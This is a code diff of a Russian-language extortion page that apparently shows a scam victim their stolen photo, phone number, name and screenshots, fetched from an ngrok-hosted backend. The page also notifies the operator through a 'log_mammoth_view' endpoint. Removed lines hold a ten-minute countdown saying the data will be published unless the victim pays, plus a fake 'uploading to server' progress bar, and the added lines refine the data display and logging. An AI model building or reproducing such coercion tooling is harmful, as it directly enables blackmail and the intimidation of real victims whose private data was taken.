@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Система активирована</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -30,81 +30,7 @@
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         .subheader { color: #ff6680; font-size: 15px; margin-bottom: 25px; }
         
-        /* ===== ТАЙМЕР ===== */
-        .timer-container {
-            background: rgba(255, 51, 85, 0.1);
-            border: 2px solid #ff3355;
-            border-radius: 15px;
-            padding: 15px 20px;
-            margin-bottom: 25px;
-            box-shadow: 0 0 30px rgba(255, 51, 85, 0.2);
-            animation: glowPulse 2s infinite;
-        }
-        @keyframes glowPulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 51, 85, 0.2); }
-            50% { box-shadow: 0 0 40px rgba(255, 51, 85, 0.5); }
-        }
-        .timer-label {
-            color: #ff6680;
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-bottom: 5px;
-        }
-        .timer-display {
-            color: #ff3355;
-            font-size: 36px;
-            font-weight: bold;
-            font-family: 'Courier New', monospace;
-            text-shadow: 0 0 20px rgba(255, 51, 85, 0.4);
-        }
-        .timer-sub {
-            color: #888;
-            font-size: 11px;
-            margin-top: 5px;
-        }
-        
-        /* ===== ПОЛОСКА ЗАГРУЗКИ (НОВЫЙ БЛОК) ===== */
-        .upload-progress {
-            background: rgba(0, 255, 204, 0.05);
-            border: 1px solid rgba(0, 255, 204, 0.2);
-            border-radius: 12px;
-            padding: 15px 20px;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        .upload-progress .label {
-            color: #00ffcc;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            font-weight: bold;
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-        }
-        .upload-progress .bar-bg {
-            width: 100%;
-            height: 6px;
-            background: #1a1a1a;
-            border-radius: 6px;
-            overflow: hidden;
-        }
-        .upload-progress .bar-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #ff3355, #00ffcc);
-            border-radius: 6px;
-            transition: width 0.5s ease;
-        }
-        .upload-progress .status-text {
-            color: #666;
-            font-size: 11px;
-            margin-top: 8px;
-            text-align: center;
-            letter-spacing: 1px;
-        }
-        
+        /* ===== ФОТО С КУРСОРОМ ===== */
         .user-photo {
             width: 250px;
             height: 250px;
@@ -125,6 +51,97 @@
         .user-photo:hover { transform: scale(1.05); }
         .user-photo img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; pointer-events: none; }
         
+        /* ===== СКРИНШОТЫ С КУРСОРОМ ===== */
+        .screenshots img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: #1a1a1a;
+            min-height: 80px;
+            object-fit: cover;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        .screenshots img:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(255, 51, 85, 0.3);
+        }
+        .screenshots .empty { cursor: default; }
+        .screenshots .empty:hover { transform: none; box-shadow: none; }
+        
+        /* ===== МОДАЛЬНОЕ ОКНО ДЛЯ ПРОСМОТРА ФОТО ===== */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal.active {
+            display: flex;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .modal img {
+            max-width: 100%;
+            max-height: 90vh;
+            border-radius: 10px;
+            border: 2px solid #ff3355;
+            box-shadow: 0 0 60px rgba(255, 51, 85, 0.3);
+            object-fit: contain;
+            animation: zoomIn 0.3s ease;
+        }
+        @keyframes zoomIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .modal-close {
+            position: fixed;
+            top: 20px;
+            right: 30px;
+            color: #fff;
+            font-size: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 10000;
+            transition: 0.3s;
+            background: rgba(255, 51, 85, 0.2);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        .modal-close:hover {
+            background: rgba(255, 51, 85, 0.4);
+            transform: rotate(90deg);
+            border-color: #ff3355;
+        }
+        .modal-counter {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #888;
+            font-size: 14px;
+            background: rgba(0,0,0,0.7);
+            padding: 8px 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+            z-index: 10000;
+        }
+        
         .info-block {
             background: rgba(0,0,0,0.5);
             border: 1px solid rgba(255,51,85,0.2);
@@ -135,50 +152,19 @@
         }
         .info-block .label { color: #ff6680; font-size: 12px; text-transform: uppercase; letter-spacing: 2px; font-weight: bold; }
         .info-block .value { color: #00ffcc; font-size: 15px; margin-top: 8px; word-break: break-word; max-height: 300px; overflow-y: auto; white-space: pre-wrap; line-height: 1.6; }
-        
         .screenshots { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
-        .screenshots img { width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); background: #1a1a1a; min-height: 80px; object-fit: cover; cursor: pointer; transition: transform 0.2s ease; }
-        .screenshots img:hover { transform: scale(1.02); }
         .screenshots .empty { background: #1a1a1a; height: 100px; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #444; font-size: 12px; border: 1px dashed #333; }
-        
         .status { color: #ff3355; font-size: 16px; animation: blink 1s infinite; margin: 20px 0; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         .footer { color: #555; font-size: 10px; margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
         .warning { color: #ff3355; font-size: 13px; margin-top: 10px; padding: 12px; border: 1px solid rgba(255,51,85,0.2); border-radius: 8px; background: rgba(255,51,85,0.05); }
         .size-info { color: #666; font-size: 11px; margin-top: 10px; }
-        
-        /* ===== МОДАЛКА ===== */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
-        .modal.active { display: flex; }
-        .modal img { max-width: 100%; max-height: 90vh; border-radius: 10px; border: 2px solid #ff3355; box-shadow: 0 0 60px rgba(255,51,85,0.3); }
-        .modal-close { position: fixed; top: 20px; right: 30px; color: #fff; font-size: 40px; cursor: pointer; z-index: 10000; transition: 0.3s; background: rgba(255,51,85,0.2); width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid rgba(255,255,255,0.2); }
-        .modal-close:hover { background: rgba(255,51,85,0.4); transform: rotate(90deg); }
-        .modal-counter { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); color: #888; font-size: 14px; background: rgba(0,0,0,0.7); padding: 8px 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); z-index: 10000; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">🔴 СИСТЕМА АКТИВИРОВАНА</div>
         <div class="subheader">Ваши данные находятся в открытом доступе</div>
-
-        <!-- ===== ТАЙМЕР ===== -->
-        <div class="timer-container">
-            <div class="timer-label">⏳ ДАННЫЕ БУДУТ ОПУБЛИКОВАНЫ ЧЕРЕЗ</div>
-            <div class="timer-display" id="timerDisplay">10:00</div>
-            <div class="timer-sub">⛔ Отменить публикацию можно только оплатой</div>
-        </div>
-
-        <!-- ===== ПОЛОСКА ЗАГРУЗКИ ===== -->
-        <div class="upload-progress">
-            <div class="label">
-                <span>📤 ПОДГОТОВКА ДАННЫХ К ПУБЛИКАЦИИ</span>
-                <span id="progressPercent">0%</span>
-            </div>
-            <div class="bar-bg">
-                <div class="bar-fill" id="progressFill"></div>
-            </div>
-            <div class="status-text" id="progressStatus">⏳ Инициализация...</div>
-        </div>
 
         <div class="user-photo" id="userPhoto"><span>📸</span></div>
 
@@ -215,7 +201,7 @@
         </div>
     </div>
 
-    <!-- ===== МОДАЛЬНОЕ ОКНО ===== -->
+    <!-- ===== МОДАЛЬНОЕ ОКНО ДЛЯ ПРОСМОТРА ФОТО ===== -->
     <div class="modal" id="modal">
         <span class="modal-close" id="modalClose">✕</span>
         <img id="modalImage" src="" alt="Увеличенное фото">
@@ -224,80 +210,18 @@
 
     <script>
         // ============================================================
-        // 1. ТАЙМЕР (10 МИНУТ)
-        // ============================================================
-        let totalSeconds = 600;
-        const timerDisplay = document.getElementById('timerDisplay');
-        
-        function updateTimer() {
-            const mins = Math.floor(totalSeconds / 60);
-            const secs = totalSeconds % 60;
-            timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-            if (totalSeconds <= 0) {
-                timerDisplay.textContent = '00:00';
-                timerDisplay.style.color = '#ff0000';
-                document.querySelector('.timer-container').style.borderColor = '#ff0000';
-                return;
-            }
-            totalSeconds--;
-        }
-        updateTimer();
-        setInterval(updateTimer, 1000);
-
-        // ============================================================
-        // 2. ПОЛОСКА ЗАГРУЗКИ (МЕДЛЕННО РАСТЕТ)
-        // ============================================================
-        let progress = 0;
-        const progressFill = document.getElementById('progressFill');
-        const progressPercent = document.getElementById('progressPercent');
-        const progressStatus = document.getElementById('progressStatus');
-        
-        const statuses = [
-            '⏳ Сбор данных...',
-            '⏳ Анализ контактов...',
-            '⏳ Подготовка файлов...',
-            '⏳ Проверка целостности...',
-            '⏳ Шифрование архива...',
-            '⏳ Загрузка на сервер...',
-            '⏳ Ожидание подтверждения...',
-            '✅ Публикация начата!'
-        ];
-        let statusIndex = 0;
-        
-        function updateProgress() {
-            if (progress >= 100) {
-                progressStatus.textContent = '✅ ДАННЫЕ ОПУБЛИКОВАНЫ!';
-                progressStatus.style.color = '#ff3355';
-                return;
-            }
-            
-            // Медленный рост: +0.05% за шаг (~2% в минуту)
-            progress += 0.05;
-            if (progress > 100) progress = 100;
-            
-            progressFill.style.width = progress + '%';
-            progressPercent.textContent = Math.round(progress) + '%';
-            
-            // Меняем статус каждые ~15%
-            const newIndex = Math.min(Math.floor(progress / 15), statuses.length - 1);
-            if (newIndex !== statusIndex) {
-                statusIndex = newIndex;
-                progressStatus.textContent = statuses[statusIndex];
-            }
-            
-            setTimeout(updateProgress, 1000);
-        }
-        
-        // Запускаем через 1 секунду после загрузки
-        setTimeout(updateProgress, 1000);
-
-        // ============================================================
-        // 3. ГАЛЕРЕЯ
+        // ПОЛУЧАЕМ ID ИЗ URL (например /abc123)
         // ============================================================
         const path = window.location.pathname;
         const shortId = path.substring(1);
-        const NGROK_URL = 'https://2d2b-178-88-32-33.ngrok-free.app';
         
+        const NGROK_URL = 'https://563f-178-88-32-33.ngrok-free.app';
+        
+        console.log('🔍 ID из URL:', shortId);
+        
+        // ============================================================
+        // ПЕРЕМЕННЫЕ ДЛЯ ГАЛЕРЕИ
+        // ============================================================
         let allImages = [];
         let currentImageIndex = 0;
         const modal = document.getElementById('modal');
@@ -305,6 +229,9 @@
         const modalCounter = document.getElementById('modalCounter');
         const modalClose = document.getElementById('modalClose');
         
+        // ============================================================
+        // ФУНКЦИЯ ОТКРЫТИЯ МОДАЛЬНОГО ОКНА
+        // ============================================================
         function openModal(index) {
             if (allImages.length === 0) return;
             currentImageIndex = index;
@@ -319,11 +246,18 @@
             document.body.style.overflow = '';
         }
         
+        // ============================================================
+        // ЗАКРЫТИЕ ПО КЛИКУ НА ФОН
+        // ============================================================
         modal.addEventListener('click', function(e) {
             if (e.target === modal) closeModal();
         });
+        
         modalClose.addEventListener('click', closeModal);
         
+        // ============================================================
+        // КЛАВИШИ ВЛЕВО/ВПРАВО ДЛЯ ГАЛЕРЕИ
+        // ============================================================
         document.addEventListener('keydown', function(e) {
             if (!modal.classList.contains('active')) return;
             if (e.key === 'Escape') closeModal();
@@ -340,44 +274,66 @@
                 modalCounter.textContent = `${currentImageIndex + 1} / ${allImages.length}`;
             }
         });
-
-        // ============================================================
-        // 4. ЗАГРУЗКА ДАННЫХ С БЭКЕНДА
-        // ============================================================
+        
         if (shortId) {
             const headers = new Headers();
             headers.append('ngrok-skip-browser-warning', 'true');
             
-            // Уведомление админу
+            // ============================================================
+            // ОТПРАВКА УВЕДОМЛЕНИЯ АДМИНУ
+            // ============================================================
             const notifyUrl = `${NGROK_URL}/log_mammoth_view/${shortId}`;
-            fetch(notifyUrl, { headers }).catch(() => {});
+            console.log('📢 Отправка уведомления админу:', notifyUrl);
             
-            // ФОТО
+            fetch(notifyUrl, { headers })
+                .then(response => response.json())
+                .then(data => console.log('✅ Уведомление отправлено:', data))
+                .catch(error => console.error('❌ Ошибка уведомления:', error));
+            
+            // ============================================================
+            // 1. ЗАГРУЖАЕМ ФОТО
+            // ============================================================
             const photoUrl = `${NGROK_URL}/photo/${shortId}`;
+            console.log('📸 Запрос фото:', photoUrl);
+            
             fetch(photoUrl, { headers })
                 .then(response => {
-                    if (!response.ok) throw new Error('Photo not found');
+                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
                     return response.blob();
                 })
                 .then(blob => {
+                    console.log('📸 Фото получено, размер:', blob.size, 'байт');
                     const url = URL.createObjectURL(blob);
                     allImages.push(url);
+                    
                     const img = document.createElement('img');
                     img.src = url;
+                    img.alt = 'Фото пользователя';
                     img.style.cursor = 'pointer';
                     img.onclick = function() { openModal(0); };
+                    
                     document.getElementById('userPhoto').innerHTML = '';
                     document.getElementById('userPhoto').appendChild(img);
                 })
-                .catch(() => {
+                .catch(error => {
+                    console.error('❌ Ошибка загрузки фото:', error);
                     document.getElementById('userPhoto').innerHTML = '<span>❌ Фото не найдено</span>';
                 });
             
-            // ДАННЫЕ
+            // ============================================================
+            // 2. ЗАГРУЖАЕМ ДАННЫЕ
+            // ============================================================
             const dataUrl = `${NGROK_URL}/${shortId}`;
+            console.log('📡 Запрос данных:', dataUrl);
+            
             fetch(dataUrl, { headers })
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                    return response.json();
+                })
                 .then(data => {
+                    console.log('📦 Данные получены:', data);
+                    
                     if (data.success) {
                         if (data.phone) document.getElementById('userPhone').textContent = data.phone;
                         if (data.name) document.getElementById('userName').textContent = data.name;
@@ -386,14 +342,21 @@
                         if (data.screenshots && data.screenshots.length > 0) {
                             const container = document.getElementById('screenshots');
                             container.innerHTML = '';
+                            
                             data.screenshots.forEach((src, index) => {
-                                const imgUrl = 'data:image/jpeg;base64,' + src;
-                                allImages.push(imgUrl);
                                 const img = document.createElement('img');
+                                const imgUrl = 'data:image/jpeg;base64,' + src;
                                 img.src = imgUrl;
+                                img.alt = 'Скриншот ' + (index + 1);
                                 img.style.cursor = 'pointer';
+                                
+                                // Добавляем в галерею
+                                allImages.push(imgUrl);
+                                
+                                // Открываем по клику
                                 const imgIndex = allImages.length - 1;
                                 img.onclick = function() { openModal(imgIndex); };
+                                
                                 img.onerror = function() {
                                     this.outerHTML = `<div class="empty">❌ Ошибка загрузки скриншота</div>`;
                                 };
@@ -405,7 +368,8 @@
                     }
                 })
                 .catch(error => {
-                    document.getElementById('userData').textContent = '❌ Ошибка загрузки данных';
+                    console.error('❌ Ошибка загрузки данных:', error);
+                    document.getElementById('userData').textContent = '❌ Ошибка загрузки: ' + error.message;
                 });
         } else {
             document.getElementById('userData').textContent = '❌ Нет ID для загрузки';
